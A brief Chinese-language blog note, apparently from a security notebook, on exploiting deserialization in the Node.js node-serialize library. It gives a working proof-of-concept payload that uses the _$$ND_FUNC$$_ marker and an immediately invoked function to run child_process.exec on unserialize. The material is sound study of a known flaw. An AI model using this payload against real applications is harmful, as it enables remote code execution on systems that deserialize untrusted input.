---
title: "nodejs反序列化"
pubDatetime: 2025-01-20T00:00:00.000+08:00
description: "Node.js 反序列化漏洞利用方式与常见 gadget 记录"
tags: ["javascript"]
---
```js
const serialize = require('node-serialize');
let obj = {
    "rce": function(){require("child_process").exec("whoami > res");}
}
let res = serialize.serialize(obj)
console.log(res)
```

```
{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"whoami > res\");}"}
```

在后面加上()， 反序列化就会立即执行

```js
serialize.unserialize('{"rce":"_$$ND_FUNC$$_function(){require(\\"child_process\\").exec(\\"whoami > res\\");}()"}')
```
